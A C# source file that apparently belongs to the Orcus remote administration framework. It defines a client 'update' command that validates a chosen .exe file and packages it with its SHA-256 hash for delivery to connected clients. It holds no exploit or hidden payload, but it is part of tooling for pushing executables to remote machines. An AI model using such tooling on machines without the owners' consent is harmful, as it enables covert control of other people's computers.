using System;
using System.IO;
using System.Security.Cryptography;
using Orcus.Plugins;
using Orcus.Plugins.PropertyGrid;
using Orcus.Plugins.PropertyGrid.Attributes;
using Orcus.Plugins.StaticCommands;
using Orcus.Shared.Utilities;

namespace Orcus.StaticCommands.Client
{
    public class UpdateCommand : StaticCommand
    {
        public UpdateCommand()
        {
            this.RegisterProperty(() => Path, Resources.StaticCommands.Path,
                    Resources.StaticCommands.Client_UpdateCommand_PathDescription, Resources.StaticCommands.Update)
                .RegisterProperty(() => Arguments, Resources.StaticCommands.Arguments,
                    Resources.StaticCommands.ArgumentsDescription, Resources.StaticCommands.Update);
        }

        [Path(PathMode = PathMode.File, Filter = "Executable Files|*.exe")]
        public string Path { get; set; }

        public string Arguments { get; set; }

        public override Guid CommandId { get; } = new Guid(0xafd0841b, 0x0035, 0x7045, 0x96, 0x32, 0x36, 0x98, 0x6c,
            0xb1, 0x83, 0x1c);

        public override string Name { get; } = Resources.StaticCommands.Client_UpdateCommand_Name;
        public override string Description { get; } = Resources.StaticCommands.Client_UpdateCommand_Description;
        public override StaticCommandCategory Category { get; } = StaticCommandCategory.Client;

        public override InputValidationResult ValidateInput()
        {
            if (Path.IsNullOrWhiteSpace())
                return new InputValidationResult(Resources.StaticCommands.PathCannotBeEmpty, ValidationState.Error);

            var file = new FileInfo(Path);
            if (!file.Exists)
                return
                    InputValidationResult.Error(string.Format(Resources.StaticCommands.TheFileDoesnotExist, file.Name));

            if (file.Length > 1024 * 1024 * 5)
                return
                    new InputValidationResult(
                        string.Format(Resources.StaticCommands.WarningFileAbove5MiB, file.Name),
                        ValidationState.WarningYesNo);

            return InputValidationResult.Successful;
        }

        public override void Execute(CommandParameter commandParameter, IFeedbackFactory feedbackFactory, IClientInfo clientInfo)
        {
            throw new NotImplementedException();
        }

        public override CommandParameter GetCommandParameter()
        {
            using (var fs = new FileStream(Path, FileMode.Open, FileAccess.Read))
            {
                byte[] hash;

                using (var sha256 = new SHA256Managed())
                    hash = sha256.ComputeHash(fs);

                fs.Position = 0;
                var package = new byte[fs.Length + 32]; //This will be compressed automatically
                Array.Copy(hash, package, 32);
                fs.Read(package, 32, (int) fs.Length);

                return new CommandParameter(package);
            }
        }
    }
}